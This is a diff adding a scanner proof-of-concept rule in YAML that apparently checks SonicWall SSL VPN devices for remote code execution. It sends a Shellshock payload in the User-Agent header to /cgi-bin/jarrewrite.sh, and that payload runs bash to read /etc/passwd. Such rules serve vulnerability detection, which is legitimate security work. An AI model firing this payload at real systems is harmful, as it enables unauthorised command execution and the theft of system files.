@@ -1,0 +1,12 @@
+name: poc-yaml-sonicwall-ssl-vpn-rce
+rules:
+  - method: GET
+    path: /cgi-bin/jarrewrite.sh
+    headers:
+      User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+    expression: |
+      response.status == 200 && response.body.bcontains(b"root:x:")
+detail:
+  author: sakura404x
+  links:
+    - https://github.com/darrenmartyn/VisualDoor/blob/main/visualdoor.py
